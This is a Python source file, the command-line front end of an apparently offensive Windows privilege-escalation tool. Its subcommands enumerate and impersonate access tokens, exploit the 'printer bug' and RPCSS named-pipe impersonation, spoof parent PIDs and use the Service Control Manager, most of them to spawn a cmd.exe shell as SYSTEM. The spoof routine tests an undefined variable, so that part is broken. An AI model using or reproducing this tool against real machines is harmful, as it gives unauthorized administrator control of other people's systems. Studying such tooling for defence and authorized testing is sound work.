# -*- coding: UTF-8 -*-
# By Quentin HARDY (quentin.hardy@protonmail.com) - bobsecq

from sys import exit, stdout, version_info

#Check if python 3
if version_info[0] < 3:
    print("ERROT: Python 3 has to be used")
    exit(99)

import json
import argparse
import logging
from constants import *
from impersonate import Impersonate
from escalation import Escalation
from tokenmanager import TokenManager
from utils import *

def printT(message):
    '''
    Print title
    :param message:
    :return:
    '''
    print('[#] {0}'.format(message))

def printG(message):
    '''
    print good message
    :param message:
    :return:
    '''
    print('[+] {0}'.format(message))

def printB(message):
    '''
    print bad message
    :param message:
    :return:
    '''
    print('[-] {0}'.format(message))

class MyFormatter(argparse.RawTextHelpFormatter):
    """
    Corrected _max_action_length for the indenting of subactions
    SRC: http://stackoverflow.com/questions/32888815/max-help-position-is-not-works-in-python-argparse-library
    """
    def add_argument(self, action):
        if action.help is not argparse.SUPPRESS:
            # find all invocations
            get_invocation = self._format_action_invocation
            invocations = [get_invocation(action)]
            current_indent = self._current_indent
            for subaction in self._iter_indented_subactions(action):
                # compensate for the indent that will be added
                indent_chg = self._current_indent - current_indent
                added_indent = 'x'*indent_chg
                invocations.append(added_indent+get_invocation(subaction))
            # print('inv', invocations)

            # update the maximum item length
            invocation_length = max([len(s) for s in invocations])
            action_length = invocation_length + self._current_indent
            self._action_max_length = max(self._action_max_length,
                                          action_length)

            # add the item to the list
            self._add_item(self._format_action, [action])

def configureLogging2(args):
    '''
    Configure le logging
    '''
    logformatNoColor = "%(levelname)-3s -: %(message)s"
    datefmt = "%H:%M:%S"
    #Set log level
    if "verbose" in args:
        if args['verbose']==0: level=logging.WARNING
        elif args['verbose']==1: level=logging.INFO
        elif args['verbose']==2: level=logging.DEBUG
        elif args['verbose']>2:
            level=logging.DEBUG
    else:
        level=level=logging.WARNING
    logging.basicConfig(level=level,
                        format=logformatNoColor,
                        datefmt=datefmt,
                        )
    root = logging.getLogger()
    root.setLevel(level)
    hdlr = root.handlers[0]
    formatter = logging.Formatter(logformatNoColor, datefmt=datefmt)
    hdlr.setFormatter(formatter)

def cangetadmin(args):
    '''
    '''
    printT("Current thread is be able to get administrator access:")
    imp = Impersonate()
    status = imp.canGetAdminAccess()
    if status == True:
        printG("Yes. Current thread is be able to get administrator access")
    else:
        printB("No. Current thread is NOT able to get administrator access")

def printalltokens(args):
    '''
    '''
    printT("All tokens which are accessible from current thread:")
    if 'currentpidonly' in args and args['currentpidonly'] == True:
        args['pid'] = GetCurrentProcessId()
    imp = Impersonate()
    if args['filter']=='':
        imp.printAllTokensAccessible(targetPID=args['pid'],
                                 printFull=args['printFull'],
                                 printLinked=args['printLinked'],
                                 _useThreadMethod=args['_useThreadMethod'])
    else:
        filter = json.loads(args['filter'])
        imp.printTokensAccessibleFilter(targetPID=args['pid'],
                                        filter=filter,
                                        printFull=args['printFull'],
                                        printLinked=args['printLinked'],
                                        _useThreadMethod=args['_useThreadMethod'])

def printalltokensbyname(args):
    printT("All tokens which are accessible from current thread by account name:")
    imp = Impersonate()
    imp.printTokensAccessibleByAccountNameAndPID(targetPID=args['pid'], oneMaxByPid=args['oneMaxByPid'],
                                                 _useThreadMethod=args['_useThreadMethod'])

def printalltokensbypid(args):
    printT("All tokens which are accessible from current thread by PID:")
    imp = Impersonate()
    imp.printTokensAccessibleByPID(targetPID=args['pid'], impPossibleOnly=args['impPossibleOnly'],
                                   _useThreadMethod=args['_useThreadMethod'])

def printsystemtokens(args):
    printT("All nt authority\\system tokens which are accessible from current thread:")
    imp = Impersonate()
    imp.printSystemTokensAccessible(targetPID=args['pid'],
                                    oneMaxByPid=args['oneMaxByPid'],
                                    impersonationPossibleOnly=args['impPossibleOnly'],
                                    printFull=args['printFull'])

def searchimpfirstsystem(args):
    '''
    Impersonate the first system token which is available and prompt a cmd.exe.
    :param args:
    :return: True if success, otherwise false
    '''
    printT("Searching and impersonating first nt authority\\system token...")
    imp = Impersonate()
    status = imp.searchAndImpersonateFirstSystemToken(targetPID=args['pid'], printAllTokens=False)
    if status == True:
        imp.enableAllUserRights()
        imp.executeCMDWithThreadEffectiveToken()
        printT("cmd.exe prompt started as system")
        return True
    else:
        logging.error("Impossible to prompt a cmd.exe as system.")
        return False

def imppid(args):
    if args['pid'] == None:
        logging.error("A pid has to be selected")
    else:
        printT("Impersonating primary token of pid {0}".format(args['pid']))
        imp = Impersonate()
        imp.enableAllUserRights()
        status = imp.impersonateViaPID(pid=args['pid'])
        if status == True:
            printT("Trying to open a cmd shell...")
            printT("NOTICE: If not enough privileges for targeted pid, you can't open a cmd.exe shell")
            imp.printCurrentThreadEffectiveToken()
            imp.enableAllUserRights()
            imp.executeCMDWithThreadEffectiveToken()
        else:
            logging.error("Impossible to impersonate")

def imptoken(args):
    if args['pid'] == None:
        logging.error("A pid has to be selected")
    else:
        if args['ihandle'] == None:
            printT("Impersonating primary token of pid {0}".format(args['pid']))
        else:
            printT("Impersonating token of the thread ihandle {0} of pid {1}".format(args['ihandle'], args['pid']))
        imp = Impersonate()
        imp.enableAllUserRights()
        status = imp.impersonateThisToken(pid=args['pid'], iHandle=args['ihandle'])
        if status == True:
            printT("Trying to open a cmd shell...")
            printT("NOTICE: If not enough privileges for targeted pid, you can't open a cmd.exe shell")
            imp.printCurrentThreadEffectiveToken()
            imp.enableAllUserRights()
            imp.executeCMDWithThreadEffectiveToken()
        else:
            logging.error("Impossible to impersonate")

def printerbug(args):
    printT("Trying to exploit the 'printer bug'...")
    printT("It can take many seconds, so wait...")
    esc = Escalation()
    status = esc.namedPipeImpersonationSystemViaPrinterBug()
    if status == True:
        imp = Impersonate()
        imp.enableAllUserRights()
        imp.executeCMDWithThreadEffectiveToken()
    else:
        logging.error("Impossible to exploit the 'printer bug'")

def rpcss(args):
    printT("Trying to exploit 'RPCSS'...")
    printT("It can take many seconds, so wait...")
    esc = Escalation()
    status = esc.namedPipeImpersonationSystemViaRPCSS()
    if status == True:
        imp = Impersonate()
        imp.enableAllUserRights()
        imp.executeCMDWithThreadEffectiveToken()
    else:
        logging.error("Impossible to exploit 'RPCSS'")

def spoof(args):
    if args['candidates'] == True:
        printT("Candidates:")
        esc = Escalation()
        esc.printCandidatesSpoofPPID()
    if args['pid'] == None:
        logging.error("A pid has to be selected")
    else:
        printT("Trying to exploit parent PID Spoofing...")
        esc = Escalation()
        targetPID = args['pid']
        esc.spoofPPID(ppid=targetPID,
                      appName="c:\\windows\\system32\\cmd.exe",
                      cmdLine=None,
                      lpProcessAttributes=None,
                      lpThreadAttributes=None,
                      bInheritHandles=0,
                      creationFlags=(CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT),
                      lpEnvironment=None,
                      lpCurrentDirectory=None)
        if status == true:
            printT("Process created")
        else:
            logging.error("Impossible to create the new process")

def impuser(args):
    if args['username'] == None or args['password']==None:
        logging.error("username or password has to be given")
    else:
        printT("Try to impersonate via creds...")
        imp = Impersonate()
        status = imp.impersonateViaCreds(login=args['username'],
                                password=args['password'],
                                domain=args['domain'],
                                logonType=LOGON32_LOGON_INTERACTIVE,
                                logonProvider=LOGON32_PROVIDER_DEFAULT)
        if status == True:
            printT("Impersonation success, try to spawn a shell...")
            printT("SE_INCREASE_QUOTA_NAME and SE_ASSIGNPRIMARYTOKEN_NAME should be required")
            imp.printCurrentThreadEffectiveToken(printFull=True, printLinked=False)
            imp.executeCMDWithThreadEffectiveToken()
        else:
            logging.error("Impossible to impersonate via creds")

def runas(args):
    if args['username'] == None or args['password']==None:
        logging.error("username or password has to be given")
    else:
        printT("Try to run as via creds...")
        startupInfo = STARTUPINFO()
        startupInfo.cb = sizeof(startupInfo)
        processInformation = PROCESS_INFORMATION()
        processInformation.wShowWindow = 0x1  # 0x1 == show normal size, 0x3 == maximize
        processInformation.dwFlags = 0x1  # have to set this flag for the API to check the wShowWindow setting
        applicationName = getFullCmdPath()
        status = CreateProcessWithLogonW(args['username'], args['domain'], args['password'],
                                LOGON_WITH_PROFILE, #LOGON_NETCREDENTIALS_ONLY,
                                applicationName,
                                None,
                                CREATE_NEW_CONSOLE,
                                None,
                                None,
                                byref(startupInfo),
                                byref(processInformation))
        if status == 0:
            logging.error("Impossible to create new process: {0}".format(getLastErrorMessage()))
            return False
        printT("New process created")

def scm(args):
    if args["toSystem"] == True:
        printT("Try to spawn a system shell via scm & impersonation...")
        esc = Escalation()
        imp = Impersonate()
        status = esc.namedPipeImpersonationSystemViaSCM(ps=True, debug=False)
        imp.printCurrentThreadEffectiveToken()
        if status == True:
            imp = Impersonate()
            imp.executeCMDWithThreadEffectiveToken()


def main():
    #Parse Args
    myFormatterClass = lambda prog: MyFormatter(prog, max_help_position=25, width=150)
    mySubFormatterClass = lambda prog: MyFormatter(prog, max_help_position=45, width=150)
    mySpecialSubFormatterClass = lambda prog: MyFormatter(prog, max_help_position=60, width=150)
    parser = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=myFormatterClass)
    #1- Parent parsers
    parser.add_argument('--version', action='version', version=CURRENT_VERSION)
    # 1.1- Parent parser: optional
    PPoptional = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPoptional._optionals.title = "optional arguments"
    PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='enable verbosity (-vv for more)')
    # 1.2- Parent parser
    PPmethod = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPmethod._optionals.title = "method"
    PPmethod.add_argument('--threads', dest='_useThreadMethod', action='store_true', required=False,
                           help='use "threads" method instead of "handles" method (default: %(default)s)')
    # 1.3- Parent parser
    PPtargetPID = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPtargetPID._optionals.title = "target pid"
    PPtargetPID.add_argument('--pid', dest='pid',required=False, type=int, default=None, help='select a target pid only (default: %(default)s)')
    PPtargetPID.add_argument('--current', dest='currentpidonly', required=False,  action='store_true',help='current pid only')
    # 1.3- Parent parser
    PPtargethandle = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPtargethandle._optionals.title = "target handle"
    PPtargethandle.add_argument('--ihandle', dest='ihandle', required=False, type=int, default=None,
                             help='select this ihandle i.e. impersonation token (default: %(default)s)')
    # 1.4- Parent parser
    PPdetails = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPdetails._optionals.title = "details"
    PPdetails.add_argument('--full', dest='printFull', action='store_true', required=False,
                           help='print all details about tokens (default: %(default)s)')
    PPdetails.add_argument('--linked', dest='printLinked', action='store_true', required=False,
                           help='print details about linked token if it exists (default: %(default)s)')
    # 1.5- Parent parser
    PPoneMaxByPid = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPoneMaxByPid._optionals.title = "oneMaxByPid"
    PPoneMaxByPid.add_argument('--one-max-by-pid', dest='oneMaxByPid', action='store_true', required=False,
                           help='max one token info by pid, first one, for print type "an" only. (default: %(default)s)')
    # 1.6- Parent parser
    PPprintimp = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPprintimp._optionals.title = "print impersonation filter"
    PPprintimp.add_argument('--imp-only', dest='impPossibleOnly', action='store_true', required=False,
                           help='print when impersonation is possible only (default: %(default)s)')
    # 1.7- Parent parser
    PPspoof = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPspoof._optionals.title = "spoof parent pid"
    PPspoof.add_argument('--candidates', dest='candidates', action='store_true', required=False,
                            help='Print all processes which can be candidate (default: %(default)s)')
    # 1.8- Parent parser
    PPcreds = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPcreds._optionals.title = "credentials"
    PPcreds.add_argument('--username', dest='username', default=None, required=False,
                         help='Username (default: %(default)s)')
    PPcreds.add_argument('--password', dest='password', default=None, required=False,
                         help='Password (default: %(default)s)')
    PPcreds.add_argument('--domain', dest='domain', default=None, required=False,
                         help='Domain (default: %(default)s)')
    # 1.9- Parent parser
    PPscm = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPscm._optionals.title = "scm"
    PPscm.add_argument('--system', dest='toSystem', action='store_true', required=False,
                            help='execute a cmd as system via scm (default: %(default)s)')
    # 1.10- Parent parser
    PPprintfilter = argparse.ArgumentParser(add_help=False, formatter_class=myFormatterClass)
    PPprintfilter._optionals.title = "print filter"
    PPprintfilter.add_argument('--filter', dest='filter', type=str, default='', required=False,
                            help='filter tokens e.g. {\"type\":2,\"sid\":\"S-1-5-18\",\"canimpersonate\":true}')
    #2- main commands
    subparsers = parser.add_subparsers(help='\nChoose a main command')
    #3 MODULES
    parser_cangetadmin = subparsers.add_parser('cangetadmin', parents=[PPoptional],
                                               formatter_class=mySubFormatterClass,
                                               help='Check if user can get admin access')
    parser_cangetadmin.set_defaults(func=cangetadmin, auditType='cangetadmin')
    parser_printalltokens = subparsers.add_parser('printalltokens',
                                               parents=[PPoptional, PPdetails, PPmethod, PPtargetPID, PPprintfilter],
                                               formatter_class=mySubFormatterClass,
                                               help='Print all tokens accessible from current thread')
    parser_printalltokens.set_defaults(func=printalltokens, auditType='printalltokens')
    parser_printalltokensbyname = subparsers.add_parser('printalltokensbyname',
                                                  parents=[PPoptional, PPmethod, PPtargetPID, PPoneMaxByPid],
                                                  formatter_class=mySubFormatterClass,
                                                  help='Print all tokens accessible from current thread by account name')
    parser_printalltokensbyname.set_defaults(func=printalltokensbyname, auditType='printalltokensbyname')
    parser_printalltokensbypid = subparsers.add_parser('printalltokensbypid',
                                                        parents=[PPoptional, PPmethod, PPtargetPID, PPprintimp],
                                                        formatter_class=mySubFormatterClass,
                                                        help='Print all tokens accessible from current thread by pid')
    parser_printalltokensbypid.set_defaults(func=printalltokensbypid, auditType='printalltokensbypid')
    parser_printsystemtokens = subparsers.add_parser('printsystemtokens',
                                                       parents=[PPoptional, PPmethod, PPtargetPID, PPoneMaxByPid, PPprintimp, PPdetails],
                                                       formatter_class=mySubFormatterClass,
                                                       help='Print all system tokens accessible from current')
    parser_printsystemtokens.set_defaults(func=printsystemtokens, auditType='printsystemtokens')
    parser_searchimpfirstsystem = subparsers.add_parser('searchimpfirstsystem',
                                                     parents=[PPoptional, PPmethod, PPtargetPID],
                                                     formatter_class=mySubFormatterClass,
                                                     help='search and impersonate first system token')
    parser_searchimpfirstsystem.set_defaults(func=searchimpfirstsystem, auditType='searchimpfirstsystem')
    parser_imppid = subparsers.add_parser('imppid',
                                                        parents=[PPoptional, PPmethod, PPtargetPID],
                                                        formatter_class=mySubFormatterClass,
                                                        help='impersonate primary token of selected pid and try to spawn cmd.exe')
    parser_imppid.set_defaults(func=imppid, auditType='imppid')
    parser_imptoken = subparsers.add_parser('imptoken',
                                          parents=[PPoptional, PPmethod, PPtargetPID, PPtargethandle],
                                          formatter_class=mySubFormatterClass,
                                          help='impersonate primary or impersonation token of selected pid/handle and try to spawn cmd.exe')
    parser_imptoken.set_defaults(func=imptoken, auditType='imptoken')
    parser_printerbug = subparsers.add_parser('printerbug',
                                          parents=[PPoptional],
                                          formatter_class=mySubFormatterClass,
                                          help='exploit the "printer bug" for getting system shell')
    parser_printerbug.set_defaults(func=printerbug, auditType='printerbug')
    parser_rpcss = subparsers.add_parser('rpcss',
                                              parents=[PPoptional],
                                              formatter_class=mySubFormatterClass,
                                              help='exploit "rpcss" for getting system shell')
    parser_rpcss.set_defaults(func=rpcss, auditType='rpcss')
    parser_spoof = subparsers.add_parser('spoof',
                                         parents=[PPoptional,PPtargetPID,PPspoof],
                                         formatter_class=mySubFormatterClass,
                                         help='parent PID Spoofing ("handle inheritance)"')
    parser_spoof.set_defaults(func=spoof, auditType='spoof')
    parser_impuser = subparsers.add_parser('impuser',
                                         parents=[PPoptional, PPcreds],
                                         formatter_class=mySubFormatterClass,
                                         help='create process with creds with impersonation')
    parser_impuser.set_defaults(func=impuser, auditType='impuser')
    parser_runas = subparsers.add_parser('runas',
                                           parents=[PPoptional, PPcreds],
                                           formatter_class=mySubFormatterClass,
                                           help='create process with creds as runas')
    parser_runas.set_defaults(func=runas, auditType='runas')
    parser_scm = subparsers.add_parser('scm',
                                         parents=[PPoptional, PPscm],
                                         formatter_class=mySubFormatterClass,
                                         help='create process with Service Control Manager')
    parser_scm.set_defaults(func=scm, auditType='scm')
    #4- parse the args
    args = dict(parser.parse_args()._get_kwargs())
    arguments = parser.parse_args()
    #5- Configure logging and output
    configureLogging2(args)
    try:
        arguments.func(args)
    except AttributeError:
        parser.error("Too few arguments. Try with -h")
    exit(0)

if __name__ == "__main__":
	main()